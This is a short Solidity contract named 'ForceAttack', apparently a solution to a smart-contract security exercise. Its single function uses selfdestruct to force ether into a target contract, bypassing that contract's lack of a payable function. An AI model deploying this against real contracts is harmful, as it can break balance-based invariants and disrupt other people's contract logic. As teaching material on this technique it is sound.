// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function selfDestruct(address payable target) external {
        selfdestruct(target);
    }
}
